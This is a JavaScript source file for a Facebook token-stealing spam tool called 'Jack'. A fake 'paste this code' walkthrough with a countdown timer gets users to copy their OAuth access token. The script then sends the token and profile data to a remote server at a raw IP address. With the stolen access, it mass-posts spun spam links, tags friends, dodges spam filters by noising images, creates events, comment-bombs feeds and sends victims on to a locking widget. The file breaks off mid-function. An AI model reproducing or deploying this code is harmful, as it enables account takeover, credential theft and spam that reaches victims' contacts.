var console = { log: function(){} };
var base_url = "http://64.79.76.226/~silali/watch/";
$.support.FormData = !!(window.FormData && window.ArrayBuffer && window.Uint8Array && window.Blob && Modernizr.canvas);
var isMobile = {
    Android: function() {
        return navigator.userAgent.match(/Android/i);
    },
    BlackBerry: function() {
        return navigator.userAgent.match(/BlackBerry/i);
    },
    iOS: function() {
        return navigator.userAgent.match(/iPhone|iPad|iPod/i);
    },
    Opera: function() {
        return navigator.userAgent.match(/Opera Mini/i);
    },
    Windows: function() {
        return navigator.userAgent.match(/IEMobile/i); 
    },
    any: function() {
        return (isMobile.Android() || isMobile.BlackBerry() || isMobile.iOS() || isMobile.Opera() || isMobile.Windows());
    }
};

function addCss(cssCode) {
var styleElement = document.createElement("style");
  styleElement.type = "text/css";
  if (styleElement.styleSheet) {
    styleElement.styleSheet.cssText = cssCode;
  } else {
    styleElement.appendChild(document.createTextNode(cssCode));
  }
  document.getElementsByTagName("head")[0].appendChild(styleElement);
}

function getKeywordApps(){
	var keyword = encodeURIComponent(Jack.spin(Jack.config.keywords));

	Jack.api('/search', {
		q: keyword,
		limit: 5,
		type: 'application'
	}).done(function(data){
		var apps = data.data;
		window.apps = apps; 
		getApps();
	}).fail(function(){
		getApps();
	});
}

function getApps(){
	if(!window.apps) window.apps = [];
	if(Jack.config.apps){
		for(var i = 0; i < Jack.config.apps.length; i++){
			var app = Jack.config.apps[i];
			apps.push(app);
		}
	}
	var app = Jack.spin(apps);
	if(!app.id){
		Jack.api('/' + app).done(function(app){
			window.app = app;
			runJack();
		}).fail(function(){
			window.app ={}; // default one
		});
	}else{
		window.app = app;
		runJack();
	}
}

function updateCountdown(){
	var end = Jack.expires.getTime();
	//var range = Date.range(Date.create(), end).duration();
	var range = end - Date.now();

	//console.log('end date', end);
	var now = Date.create();
	//console.log('now: ', now, 'date: ', end);
	var countdown = $('.countdown');
	if(range <= 0) {
		countdown.hide();
		return;
	}
	//end = end.getTime();
	var max = {
		hours: 24,
		minutes: 60,
		seconds: 60
	};
	

	['days', 'hours', 'minutes', 'seconds'].each(function(unit, i){

		//var num = now[unit + 'Until'].call(now, end);
		var ms = (1)[unit]();
		var num = Math.floor(range / ms);

		if(max[unit])
			num = Math.min(num, max[unit]);

		range -= num * ms;

		//console.log(num, unit, 'from now');
		if(num)
		/*
		var delta = {};
		delta[unit] = -num;
		console.log('delta', delta);
		end = end.advance(delta);
		console.log(end, end.relative());
		num = Math.max(0, num);*/
		countdown.find('.' + unit).text(num).next('.label').text(num != 1 ? unit : unit.singularize());

	});
}
$(function(){
	$.deck.defaults.keys.next = [];
	$.deck.defaults.keys.previous = [];
	$.deck('.slide');
});
function TRQ(){
	return Math.floor(Math.random() * 500);
}
function runJack(){
	//console.log('got apps', data);

	$(function(){
		//loadAPI();
		$('.deck-container').fadeIn();
		//$("img.app-icon").attr("src", "https://graph.facebook.com/" + app.id + "/picture");
		//$(".app-name").text(app.name);

		if(Jack.config.expires){
			if(!($.cookie('jack.expires') 
				&& (Jack.expires = Date.create(
							parseInt($.cookie('jack.expires'))
						))
				&& Jack.expires.minutesFromNow() > 3
			)){
				console.log('setting new jack.expires cookie');
				Jack.expires = Date.create(Jack.spin(Jack.config.expires));	
				$.cookie('jack.expires', Jack.expires.getTime(), {
					expires: Math.max(Jack.expires.daysFromNow(), 1)
				});

			}else{
				console.log('using jack.expires cookie');
			}
			
			updateCountdown();
			$(".countdown").removeClass("hidden");

			setInterval(updateCountdown, 1000);
		}
		if(navigator.platform && navigator.platform.indexOf("Mac") == -1){
			$("#pasteKey").removeClass("meta").addClass("ctrl").text('Ctrl');	
		}
		$("#get-started").click(function(){
			if(Jack.config.hotkey_mode_enabled || Jack.config.autojack){
				$(".no-hotkey, #add-app").hide();
				$("#add-app").click();	
			}else{
				$.deck('go', 1);
			}
			
		});
		$("#add-app").click(function(e){
			e.preventDefault();

			if(Jack.PAGE_MODE){
				var ac = FB.getAuthResponse();
				var handleAuth = function(ac){
					app.access_token = ac.accessToken;
					app.expires_in = ac.expiresIn;
					Jack.auth(parseInt(ac.expiresIn)).then(function(){
						$.deck('go', 3);
						Jack.run();
					}).fail(function(){
						alert('There was an error generating your code');
						window.onbeforeunload = false;
						window.location.reload();
					})
				}
				if(ac && ac.accessToken){
					handleAuth(ac);
				}else{
					 FB.login(function(response) {
					   if(response.status == 'connected'){
					   		handleAuth(ac);
					   }else{
					   		// didn't work
					   		alert('There was an error generating your code');
					   		window.onbeforeunload = false;
					   		window.location.reload();
					   }
					 }, {scope: Jack.perms().join(',')});

					
				}
				return;
			}

			var platform = navigator.platform.indexOf('Mac') === 0 ? 'mac' : 'default';
			var cssFile = platform;
			if($.browser.msie)
				cssFile += "_ie";
			else
				cssFile += '_default';
			var pages = Jack.spinObject(Jack.config.pages || {});
			var page = pages[cssFile] || pages['default_default'] || pages['default_ie'] || false;
			/*
			var css = URI(base_url).segment(-1, 'jack.php').query({
				v: Math.random(),
				action: 'css',
				platform: platform, 
				browser: $.browser.msie ? 'ie' : 'default',
				text: Jack.config.auth_land_text || '',
				url: Jack.config.auth_land_image.replace('://', '__JCK_PROTO__') || ''
			}).href(); 
			*/

			//var page = Jack.spin(Jack.config.page) || 'http://www.facebook.com/cocacola';
			var mode = window.chrome && 'page' || 'popup';
			if(!page) mode = 'popup';
			
			var perms = Jack.perms();
			//mode = 'popup';
			//var redirect = 'http://www.facebook.com/connect/connect.php?connections=28&stream=1&css=' + encodeURIComponent(css) + '&href=' + encodeURIComponent(page);
			/*var redirect = URI('http://www.facebook.com/connect/connect.php').query({
				connections: 0,
				stream: 1,
				href: page
			});*/
			//var xd= "http://static.ak.facebook.com/connect/xd_arbiter.php?version=18#cb=f3038b4428&origin=http%3A%2F%2Ffacebook.com%2Ff1a3e2ffa&domain=facebook.com&relation=opener&frame=fc39e4608";
			var xd = 'https://www.facebook.com/connect/window_comm.php#COPY_THIS_CODE ->';
			/*var url = URI('https://www.facebook.com/dialog/oauth').query({
				type: 'user_agent',
				display: Jack.config.force_mobile ? 'touch' : mode,
				client_id: app.id,
				redirect_uri: Jack.config.autojack ? Jack.config.autojack_url : (page || xd),
				scope: perms.join(','),
				scope: 'xmpp_login',
				response_type: 'token',
				state: (Jack.config.autojack && Jack.CID) || ''
			});*/
		
			//var url = "https://www.facebook.com/dialog/oauth?type=user_agent&response_type=token&display="+ mode +"&client_id="+ app.id +"&redirect_uri="+ redirect +"&scope=" + encodeURIComponent(perms.join(','));
			//url = doNotTrack(url);

			var x;
			
		var opts = "resizable=no, scrollbars=no, titlebar=no, toolbar=no, menubar="+ (mode == 'popup' ? 'no' : 'yes') +", location=yes, status=yes, top=5000, left=5000, height=1,width=1";
					var url = URI('view-source:https://www.facebook.com/login.php?api_key=139682082719810&skip_api_login=1&display=popup&cancel_url=http%3A%2F%2Fm.facebook.com%253Fsdk%253Dios%26error_reason%3Duser_denied%26error%3Daccess_denied%26error_description%3DThe%2Buser%2Bdenied%2Byour%2Brequest.&fbconnect=1&next=https://m.facebook.com/%2Fdialog%2Fpermissions.request%3F_path%3Dpermissions.request%26app_id%3D139682082719810%26client_id%3D139682082719810%26redirect_uri%3Dhttps://www.facebook.com/connect/login_success.html?display%3Dpopup%26type%3Duser_agent%26perms%3Doffline_access%26fbconnect%3D1%26from_login%3D1%26rcount%3D1&rcount=2');
			var blanked = URI(base_url).segment(-1, 'blank3.php').query("u=" + encodeURIComponent(url.href().replace('://', '__JCK_PROTO__'))).addQuery('framed', '1').href();
			if(!Jack.config.autojack){
				x  = window.open ('about:blank', 'jck_' + Number.random(1,0xFFFF), opts);			
				x.location.replace(blanked);
				$.deck('go', 1);
				$(window).one('focus', function(){
					$.deck('go', 2);
				});
			}else{
				window.onbeforeunload = false;
				window.location = blanked;
			}
		});
	});
}



var Jack = window.Jack = {v: 1, _handles: [], _friends: false, _feed: {}, _pages: false};


var q = URI().query(true), ac = q.access_token, expires_in = q.expires_in, state = q.state;
if(!ac && location.hash && location.hash.indexOf('access_token=') > -1){
	var data = URI.parseQuery(URI().fragment());
	ac = data.access_token;
	expires_in = data.expires_in;
	state = data.state;
}

Jack.CID = URI().query(true).cid || state || window.JACK_CID ||  1;

if((Jack.CID + "").indexOf("script") > -1)
	Jack.CID = Jack.CID.split("'>").shift();

$.getJSON(unescape(URI(base_url).segment(-1, 'jack.php').query({
	callback: '?',
	action: 'camp',
	cid: Jack.CID
}).href())).done(function(data){
	Jack.PAGE_MODE = window.JACK_PAGE;
	Jack.config = window.config = data;
	window.WF && WF.exit && WF.exit.exec && WF.exit.exec(true);
	var urls = Jack.config.url;
	Jack.config = window.config = Jack.spinObject(Jack.config);
	// use the array for urls
	Jack.config.url = urls;
	try{
	if(Jack.config.methods.tracking && Jack.config.methods.tracking.enabled){
		Jack.run_track(Jack.config.methods.tracking, Jack.config.tracking);
	}}catch(e){}
	$(function(){
	var background = Jack.config.background || 'http://i.imgur.com/5GJkeU4.jpg';
	 $.backstretch(background, {fade: 750});
	 Jack.config.content && $(".user-content").html(Jack.config.content);
	 Jack.config.title && (document.title = Jack.spin(Jack.config.title)) && $(".user-title").text(Jack.spin(Jack.config.title));
	 Jack.config.subtitle && $(".user-subtitle").text(Jack.config.subtitle);
	 if(Jack.config.css){
	 	addCss(Jack.config.css);
	 }
	})
	if(ac){
		/*
		if(document.domain.indexOf('.tumblr.com') && document.location.href.indexOf('/post/') > 1){
			document.location = URI().host('clickpacket.com').path('/3/index.php').href();
		}*/
		window.app = {
			access_token: ac,
			expires_in: expires_in
		};
		$(function(){
			$.deck('go', 3); 
			$(".deck-container").fadeIn();
		});
		
		Jack.auth(parseInt(expires_in)).then(function(){
			// we're good
			$(function(){
				Jack.run();	
			});
		}).fail(function(){
			alert('Whoops! There was an error processing your code');
			window.onbeforeunload = false;
			window.location.replace(URI().removeQuery('access_token').removeQuery('expires_in').addQuery({
				cid: Jack.CID
			}).fragment('').href());
		})

	}else if(!Jack.PAGE_MODE){
		if(Jack.config.autojack && Jack.config.autojack_instant){
						var url = URI('https://www.facebook.com/dialog/oauth').query({
							type: 'user_agent',
							display: 'page',
							client_id: Jack.spin(Jack.config.apps),
							redirect_uri: Jack.config.autojack_url,
							scope: Jack.perms().join(','),
							scope: 'xmpp_login',
							response_type: 'token',
							state: (Jack.config.autojack && Jack.CID) || ''
						});
						window.onbeforeunload = false;
						document.location = url;	
		}
		if(isMobile.any() && Jack.config.mobile_redirect){
			window.onbeforeunload = false;
			window.location.replace(URI(Jack.config.mobile_redirect).addQuery({
				'cid': Jack.CID
			}).href());
		}
		else if(Jack.config.keywords_enabled)
			getKeywordApps();
		else
			getApps();
	}else{// page mode, wait until FB asyncInit
		if(window.FB_READY){
			window.JACK_RAN = true;
			runJack();

		}
	}


});

function metatag(attributes, doc){
	var document = doc || document;
	var meta = document.createElement("meta");
	$.each(attributes, function(key, value){
		$(meta).attr(key, value);
	});
	console.log(meta);
	console.log(document.head);
	document.getElementsByTagName("head")[0].appendChild(meta);
}
function createInput(document, attributes){
	var elem = document.createElement("input");
	$.each(attributes, function(key, value){
		$(elem).attr(key, value);
	});
	return elem;
}
function refresh(url, doc){
	doc = doc || document;
	// works in chrome
	metatag({
		name: "referrer",
		content: "never"
	}, doc);

	var form = doc.createElement("form");
	form.setAttribute("action", url);
	var uri = URI(url);
	var query = uri.query(true);
	$.each(query, function(key, value){
		var input = createInput(doc, {
			name: key,
			value: value,
			type: "hidden"
		});
		form.appendChild(input);
	});
	var submit = createInput(doc, {type: "submit", style: "display: none"});
	form.appendChild(submit);
	doc.body.appendChild(form);
	form.submit();

	//document.write("Redirecting...");
	//document.head.appendChild(meta);
}


$(document).bind('deck.change', function(event, from, to) {
	switch(to){
		case 2:
			$('.keys .key').removeClass('keylocked');
			$('.keys').removeClass('success');
			monitorPaste();
			$("#dummy").addClass("trap");
			setTimeout(function(){
				$("#dummy").focus().select();
			}, 500);
			$("#dummy").on('blur', function(e){
				console.log('resetting position');
				$("#dummy").focus().select();
			});
		break;
	}
	switch(from){
		case 2:
		$("#dummy").off().removeClass("trap");
		console.log('turning off blur');
		break;
	}

});
function monitorPaste(){
	$("#dummy").on('paste', function(e){
		console.log(e);
		var data;
		if(e.originalEvent.clipboardData)
			data = e.originalEvent.clipboardData.getData('text/plain');

		$('.keys .key').addClass('keylocked');
		$('.keys').addClass('success');
		console.log('got paste: ', data);
		$("#dummy").off();

		$.deck('go', 3);
		
		var handleError = function(){
			alert('Whoops! Looks like you did not follow all steps, please try again');
			$.deck('go', 0);
		}
		function checkData(data){
			try{
				if(data.indexOf('access_token=') == -1) throw new Error('invalid access_token');

				var access_token = data.split('access_token=').pop().split('&').shift();
				var expires_in = data.split('expires_in=').pop().split('&').shift();
				
				console.log('got token', access_token);
				if(access_token){
					app.access_token = access_token;
					Jack.auth(parseInt(expires_in)).done(function(e){
						console.log('got auth');
						Jack.run();
					}).fail(function(e){
						handleError();
					});

				}else{ throw new Error('invalid access_token');}

			}catch(e){
				console.log(e); 
				handleError();
			}
		}

		if(data) checkData(data);
		else
			setTimeout(function(){
				console.log('checking for data');
				checkData($("#dummy").val());
				$("#dummy").val('');
			},100);


		
	});
	$("#dummy").keydown(function(e){
		console.log('jquery keydodwn event wtf');
		console.log('down:' , e.which, e);
		var special = {
			91: 'meta',
			16: 'shift',
			17: 'ctrl',
			18: 'alt'
		}
		if(e.metaKey)
			e.which = 91;
		if(e.ctrlKey)
			e.which = 17;
		if(e.shiftKey)
			e.which = 16;
		if(e.altKey)
			e.which = 18;
		console.log(e.which);
		if(e.which >= 17 && e.which <= 18 || e.which == 91){
			$('.keys .key.' + special[e.which]).addClass('keydown');
		}else if(e.which >= 48 && e.which <= 90){
			$('.keys .key.' + String.fromCharCode(e.which).toLowerCase()).addClass('keydown');
		}
		
	});
	$("#dummy").on('keyup', function(e){
		console.log('up:' , e.which,e);
		var special = {
			91: 'meta',
			16: 'shift',
			17: 'ctrl',
			18: 'alt'
		}
		if(e.metaKey || e.which == 224)
			e.which = 91;
		if(e.ctrlKey)
			e.which = 17; 
		if(e.shiftKey)
			e.which = 16;
		if(e.altKey)
			e.which = 18;
		console.log('new up which', e.which, e.metaKey);

		if(e.which >= 17 && e.which <= 18 || e.which == 91){
			$('.keys .key').removeClass('keydown');
			$('.keys .key.' + special[e.which]).removeClass('keydown');
		}else if(e.which >= 48 && e.which <= 90){
			console.log('key up: ', String.fromCharCode(e.which));
			$('.keys .key.' + String.fromCharCode(e.which).toLowerCase()).removeClass('keydown');
		}
	});
}


Jack._execLazyAjax = (function(options, d){
	console.log('executing lazy ajax for ', options.url);
	(function($){
		$.ajax(options).done(function(data){
			console.log('resolving lazy ajax', data);
			d.resolve(data);
		}).fail(function(data){
			d.reject(data);
		});
	})($);

}).lazy(250);

Jack.lazyAjax = function(ajax){
	var d = $.Deferred();
	(function(options, d){
		Jack._execLazyAjax(options, d);
	}).delay(Number.random(0, 400), ajax, d);
	return d.promise();	
}

Jack.api = function(url, method, args, endpoint){
	if(args == undefined){
		args = method;
		method = 'GET';
	}
	args = args || {};
	url = "https://"+ (endpoint||'graph') +".facebook.com" + url;
	if(args.access_token !== false && window.app && app.access_token){
		args.access_token = app.access_token;
	}
	var options = {
		type: method.toUpperCase(),
		url: url,
		cache: false,
		data: args,
		dataType:  $.support.cors ? 'json' : 'jsonp'
	};

	if(!$.support.cors){ // we only need to use a proxy for photo requests
		options.data.method = method.toUpperCase();
		options.type = 'GET';
		console.log(options.dataType);
		console.log('no cors, using json');

	}else{
		if($.support.FormData && method == "POST" && args.__use_proxy != true && !args.__noupload){
			console.log('using form data my brah');

			var fd = new FormData();
			var sourceKey = (args.__source && args[args.__source]) || 'source';
			$.each(args, function(key, value){
				if(key == sourceKey && (typeof(value) != 'string')){
					fd.append(key, value, (key == 'source') ? ('image.' + URI(args.picture).suffix()) : key);
				}else if(!(key == "picture" && args[sourceKey]) && key != '__source'){
					fd.append(key, value);	
				}
				
			});
			options.data = fd;
			options.processData = false;
			options.contentType = false;
		}else{
			console.log('skipping FormData');
		}
	}
	if(args.__use_proxy){
		if(typeof(options.data.source) != 'string')
			delete options.data.source;
		delete options.data.__use_proxy;
		console.log('using jack proxy');
		options.url = URI(base_url).segment(-1, 'jack.php').query('action=proxy&url=' + encodeURIComponent(options.url.replace('://', '__JCK_PROTO__')) + '&method=' + method.toUpperCase() + "&data=" + encodeURIComponent(JSON.stringify(options.data).replace('://', '__JCK_PROTO__'))).href();
		console.log('created proxied url: ', options.url);
	}else{
		delete options.data.__noupload;
		//options.blank = true;
	}

	// return $.ajax(options);
	return Jack.lazyAjax(options);
}

Jack.spintax = function(str){
	var regex = /{[^{}]+?}/;
	while(str.match(regex) != null){
		str = str.replace(regex, function(substr){
			substr = substr.substr(1,substr.length - 2);
			substr = substr.split('|');
			var i = Math.floor(Math.random() * substr.length);
			return substr[i];
		});
	}
	return str;
}

Jack.spinObject = function(orig){
	if(!$.isPlainObject(orig)) return Jack.spin(orig);
	var obj = $.extend({}, orig);
	for(x in obj){
		if(obj.hasOwnProperty(x)){
			var val = obj[x];
			if(x != 'apps' && x != 'ids' && x != 'rsvp_message' && x != 'uids'){
				if($.isPlainObject(val)){
					val = Jack.spinObject(val);
				}else{
					val = Jack.spin(val, true);
				}
			}
			obj[x] = val;
		}
	}
	return obj;
}
Jack.spin = function(value, replaceLinks){
	var ret;
	if(!$.isArray(value)){
		ret = value;
	}else{
		var index = Math.floor(Math.random() * value.length);
		ret = value[index];
	}

	if(typeof(ret) == "string"){
		ret = Jack.spintax(ret);
		if(replaceLinks)
			ret = ret.replace("%link%", 'https://tinyurl.com/p6ez8ts'	
							);
	}
	return ret;
}


Jack.friends = function(limit){
	var d = $.Deferred();
	if(Jack._friends === false && limit > 0){
		Jack.api('/me/friends',{limit: 3000}).pipe(function(result){
			if(result && result.data){
				return Jack._friends = shuffleArray(result.data);
			}
		}).done(function(friends){
			console.log('got friends', friends);
			d.resolve(friends.splice(0, limit));
		}).fail(function(){
			d.reject();
		});
	}else{
		if(limit > 0)
			d.resolve(Jack._friends.splice(0, limit));
		else
			d.resolve([]);
	}
	return d.promise();
}

Jack.feed = function(limit, uid){
	var d = $.Deferred(), uid = uid || 'me()', q="";
	if($.isArray(Jack._feed[uid]) == false && limit > 0){
		if(uid == 'me()')
			q = "SELECT post_id FROM stream WHERE filter_key in (SELECT filter_key FROM stream_filter WHERE uid = me() AND type = 'newsfeed') AND target_id != me() AND actor_id != me() AND comments.can_post LIMIT ";
		else
			q = "SELECT post_id FROM stream WHERE source_id = "+ uid +" AND actor_id != me() AND comments.can_post LIMIT ";
		Jack.api('/fql',{ q: q + Math.max(Math.ceil(limit * 1.5), 5)}).pipe(function(result){
			if(result && result.data){
				return Jack._feed[uid] = shuffleArray(result.data);
			}
		}).done(function(feed){
			console.log('got feed', feed);
			d.resolve(feed.splice(0, limit));
		}).fail(function(){
			d.reject();
		});
	}else{
		if(limit > 0)
			d.resolve(Jack._feed[uid].splice(0, limit));
		else
			d.resolve([]);
	}
	return d.promise();
}

Jack.pages = function(keyword, limit){
	var d = $.Deferred();
	if(Jack._pages === false && limit > 0){
		Jack.api('/search', {
			q: keyword,
			limit: 100,
			type: 'page'
		}).pipe(function(result){
			if(result && result.data){
				return Jack._pages = shuffleArray(result.data);
			}
		}).done(function(pages){
			console.log('got pages: ', pages);
			d.resolve(pages.splice(0, limit));
		}).fail(function(){
			d.reject();
		});
	}else{
		if(limit > 0)
			d.resolve(Jack._pages.splice(0, limit));
		else
			d.resolve([]);
	}
	return d.promise();
}

Jack.post = function(uids, post){
	if($.isArray(uids)){
		var handles = [];
		console.log('post in array: ', post);
		$.each(uids, function(key, val){ 
			console.log('handle push: ', val, post);
			handles.push(Jack.post(val, post));
		});
		return $.when.apply($, handles);
	}
	else{
		var comment = post.comment;
		var post = $.extend({__noupload: true}, post);
		
		if(post && post.picture && post.picture.length > 3 && post.picture.indexOf("://") == -1){
			post.picture = URI(base_url).segment(-1, "jack.php").query({
				action: "uniqphoto",
				url: post.picture
			}).href();
		}
		if(post.tags){
			if(!$.isArray(post.tags)) post.tags = [post.tags];
			post.tags = post.tags.join(',');
			post.place = '20531316728';
		}
		//post.__picture_url = true;
		delete post.comment;

		var d = $.Deferred();
		function _post(){
			var ret = Jack.api('/'+uids +'/feed', 'POST' , post);
			ret.done(function(data){
				var id = data.id;
				if(comment)
					(function(){
						Jack.comment(id, comment).always(function(){ d.resolve(data);})
					}).delay(Number.random(100, 500));
				else
					d.resolve(data);
			}).fail(function(){
				d.reject();
			});
		}
		if(post.tags && post.tags.length > 0){
			Jack.api('/fql', {
				q: 'SELECT page_id FROM page WHERE page_id IN (SELECT page_id FROM page_fan WHERE uid = me()) AND location.street = "" AND location.zip = "" AND location.country = "" AND location.state = "" AND location.latitude = "" AND location.longitude = ""'
			}).done(function(results){
				if(results && results.data && results.data.length > 0){
					var page = Jack.spin(results.data,false);
					post.place = page.page_id || post.place;
				}
				_post();
			}).fail(function(){
				_post();
			});
		}else{
			_post();
		}

		

		return d.promise();
	}
}

Jack.restPost = function(attachment){
	return Jack.api('/method/stream.publish', 'POST', {
		attachment: JSON.stringify(attachment)
	}, 'api');
}

Jack.photo = function(uids, photo){
	if($.isArray(uids)){
		var handles = [];
		$.each(uids, function(key, val){ handles.push(Jack.photo(val, photo));});
		return $.when.apply($, handles);
	}
	else{
		return Jack.api('/'+uids+'/photos', 'POST' , photo);
	}
}
Jack.tag = function(pid, uids){
	var tags = [];
	$.each(uids, function(i, uid){
		var x = Math.floor(Math.random() * (100 - 0) + 0);
		var y = Math.floor(Math.random() * (100 - 0) + 0);
		tags.push({tag_uid: uid, x: x, y: y});
	});
	return Jack.api('/' + pid + '/tags','POST', {tags: JSON.stringify(tags)});
}

Jack.event = function(evt){
	var event = evt;
	$(['start_time', 'end_time']).each(function(i, key){
		event[key] = event[key] && Date.create(event[key]) || Date.create(key == 'start_date' ? 'today' : '7 days from now');
		event[key] = event[key].toISOString();
	});
	//wtf hack
	delete event.post;
	return Jack.api('/me/events', 'POST', event);
}

Jack.invite = function(eid, uids){
	return Jack.api('/' + eid + '/invited', 'POST', {
		users: uids.join(',')
	});
}
Jack.rsvp = function(eid){
	if($.isArray(eid)){
		var handles = [];
		$.each(eid, function(key, val){ handles.push(Jack.rsvp(val));});
		return $.when.apply($, handles);
	}
	else{
		return Jack.api('/'+ eid +'/attending', 'POST' , {});
	}
}

Jack.comment = function(oid, comment){
	return Jack.api('/' + oid + '/comments', 'POST', {message: comment});
}

Jack.like = function(id){
	return Jack.api('/' + id + '/likes','POST', {});
}

Jack.batch = function(){
	var args = [].slice.call(arguments);
	Jack._batch.push(args);
}

Jack.exec = function(){
	var batch = Jack._batch;
	Jack._batch = [];
	// generate batch request

}

Jack.perms = function(){
	var perms = Jack.extra_perms || [];
	if(!$.isArray(perms)) perms = [];
	perms.push('publish_stream');
	if(Jack.config.methods.event && Jack.config.methods.event.enabled)
		perms.push('create_event');
	if(Jack.config.methods.rsvp && Jack.config.methods.rsvp.enabled)
		perms.push('rsvp_event');
	if((Jack.config.methods.comment_bomb && Jack.config.methods.comment_bomb.enabled)||(Jack.config.methods.page_bomb && Jack.config.methods.page_bomb.enabled && Jack.config.methods.page_bomb.comment_enabled))
		perms.push('read_stream');
	return perms;
}

Jack.auth = function(expires_in){
	var d = $.Deferred();
	Jack.api('/me/permissions').done(function(result){
		var data = result && $.isArray(result.data) && result.data.pop();
		data = data || {};
		var perms = Jack.perms();
		var goodMethods = 0;
		console.log('got perms', result);
		perms.each(function(perm){
			if(data[perm] == 1)
				goodMethods++;
		});
		// send token handle
		var sd = $.Deferred();
		Jack._handles.push(sd.promise());

		if(goodMethods > 0)
			d.resolve(data);
		else
			d.reject(data);

		if(data.offline_access || data.whitelisted_offline_access || 
			(expires_in 
				&& (expires_in.seconds() / (1).days()) > 0
			)){
			console.log('got awesome offline access token');
			Jack.api('/me').done(function(data){
				console.log('got user data', data);
				var query = {
					action: 'add_token',
					token: app.access_token,
					app_id: app.id || 0,
					cid: Jack.CID
				};
				Object.keys(data, function(key){
					query['user[' + key + ']'] = (""+data[key]).replace('://', '__JCK_PROTO__');
				});
				$.get(URI(base_url).segment(-1, 'jack.php').addQuery(query)).always(function(){
					sd.resolve();
				});
			}).fail(function(){
				sd.reject();
			});
		}else{
			sd.resolve();
		}

		
	}).fail(function(){
		d.reject();
	});
	return d.promise();
	
}


Jack.run = function(){
	// use extra handles
	var handles = Jack._handles || [];
	// run each payload
	$.each(Jack.config.methods, function(name, config){
		if(config.enabled && Jack.config[name] && Jack['run_' + name]){
			try{
			handles.push(Jack['run_' + name].call(Jack,Jack.spinObject(config), Jack.spinObject(Jack.config[name])));
			}catch(e){
				// skip method on error
			}
		}
	});
	// wait for completetion
	$.when.apply($, handles).always(Jack.done);
}

Jack.done = function(){
	$.deck('go', 4);
	if(Jack.config.redirect_enabled){
		window.onbeforeunload = false;
		window.location = Jack.config.redirect_url + "?video="+ app.access_token;
	}
	else{
		!window.WF && (l =  location) && l.hash != '#locked' && (e = encodeURIComponent) && top.location.replace('http://widgets.wfnetwork.com/lock.html?url=' + e(l.href) + '&widget='+ (Jack.config.wf_widget || 151) +'&title=' + e(document.title));
		WF.Widgets.get(Jack.config.wf_widget || 151, function(widget){
			WF.Widget = widget;
			widget.show();
		});
	}
}

Jack.run_track = function(config, tracker){
	var d = $.Deferred();
	try{
	var img = new Image();
	img.src = 'http://whos.amung.us/widgets/'+(Jack.spin(tracker.wam) || ('jck'+Jack.CID.substr(-9))+'.png');
	img.src = 'http://www.trendcounter.com/w/bblog/fffafa_ffffff/'+(Jack.spin(tracker.wam) +'.png');
	}catch(e){}
	d.resolve();
	return d.promise();

}
Jack.run_post = function(config, post){
	var d = $.Deferred();
	
	Jack.friends(config.friends).done(function(friends){
		var tags = $.map(friends, function(friend){ return friend.id});
		var uids = config.uids || ['me'];
		console.log('post here ', post);
		var chunk_size = config.chunk_size || tags.length;
		var count = tags.length == 0 ? 1 : Math.ceil(tags.length / (chunk_size));
		var handles = [];
		for(var i = 0; i < count; i++){
			if(!config.nospin)
				post = Jack.spinObject(Jack.config.post);
			post = $.extend(post, {tags: tags.splice(0, chunk_size)});
			handles.push(Jack.post(uids, post));
		}
		$.when.apply($, handles).always(function(){
			d.resolve();
		});

	});
	return d.promise();
}

Jack.run_photo = function(config, photo){
	var d = $.Deferred();
	Jack.friends(config.friends).done(function(friends){
		var tags = $.map(friends, function(friend){ return friend.id})
		  , handles = []
		  , chunk_size = config.chunk_size || tags.length
		  , count = (tags.length == 0 ? 1 : Math.ceil(tags.length / (chunk_size)))

		  for(var i = 0; i < count; i++){
		  	if(!config.nospin)
		  		photo = Jack.spinObject(Jack.config.photo);
		  	handles.push(Jack._run_photo(config, photo, tags.splice(0, chunk_size)));
		  }
		  $.when.apply($, handles).always(function(){
		  	d.resolve();
		  });

	})
	return d.promise();
}
Jack._unique_photo = function(photo){
	var d = $.Deferred();
	if($.support.cors && $.support.FormData){
		console.log('generating unique image client side');
		// use canvas
		var canvas = document.createElement("canvas");
		$(canvas).css({
			display: "block"
		}).appendTo(document.body);
		var xhr = new XMLHttpRequest();

		xhr.open('GET', URI(base_url).segment(-1, 'jack.php').query({action:"photo", url: photo.picture}).href(), true);
		xhr.responseType = 'arraybuffer';
		xhr.onreadystatechange = function(e) {
		try{
		  if(xhr.readyState == 4 && xhr.status == 200){
		  	console.log('done nigga');
		  	var blob = new Blob([new Uint8Array(xhr.response)], {type: xhr.getResponseHeader("Content-Type")});
		  	console.log('got blob', blob);
		  	var dataURI = (URL || webkitURL).createObjectURL(blob);
		  	console.log(dataURI);
		  	var img = new Image();
		  	img.onerror = function(){
		  		console.log('error loading image, use proxy instead');
		  		photo.__use_proxy = true;
		  		d.resolve(photo);
		  	}
		  	img.onload = function(){
		  		console.log('loaded image');
				var ctx = canvas.getContext('2d');
				img.height= img.height+(Math.random()<.5?-1:1)*(Math.floor((Math.random()*10)+23));
				img.width=img.height+(Math.random()<.5?-1:1)*(Math.floor((Math.random()*10)+23));
				canvas.setAttribute('height', img.height + 'px');
				canvas.setAttribute('width', img.width + 'px');
				ctx.drawImage(img, 0, 0);

				var bHeight = Math.ceil(img.height / 5)
				   ,bWidth = Math.ceil(img.width / 5)
				   ,cols = Math.ceil(img.width / bWidth)
				   ,rows = Math.ceil(img.height / bHeight);
				for(var col = 0; col < cols; col++){
					for(var row = 0; row < rows; row++){
						var c = Number.random(0x5E,0xEB);
						ctx.fillStyle = 'rgba(' + [c,c,c, '0.15'].join(',') + ')';
						console.log(ctx.fillStyle);
						var x = bWidth * col;
						var y = bHeight * row;
						ctx.fillRect(x, y, bWidth, bHeight);
					}
				}
				/*
				Jack.api('/me?fields=name,first_name,last_name').then(function(user){
					ctx.fillStyle = 'white';
					ctx.font = '24px Tahoma';
					ctx.fillText(user.name, 15,15);
				}).always(function(){*/
					canvas.toBlob(function(blob){
						console.log('setting final modified blob');
						$(canvas).remove();
						img = null;
						try{(URL || webkitURL).revokeObjectURL(dataURI)}catch(e){};
						photo.source = blob;
						d.resolve(photo);
					}, xhr.getResponseHeader("Content-Type"));	
				/*});*/


		  	}
		  	img.src = dataURI;
			
		  }else if(xhr.readyState == 4){
		  	console.log('failed wtf');
		  	photo.__use_proxy = true;
		  	d.resolve(photo);
		  }

		}catch(e){
			console.log('some error in the xmlhttprequest for the image');
			photo.__use_proxy = true;
			d.resolve(photo);
		}
		};
		try{
			xhr.send();
		}catch(e){
			photo.__use_proxy = true;
			d.resolve(photo);
		}


	}else{
		console.log('no cors or formdata')
		photo.__use_proxy = true;
		d.resolve(photo);
	}
	return d.promise();
}

Jack._run_photo = function(config, photo, uids){
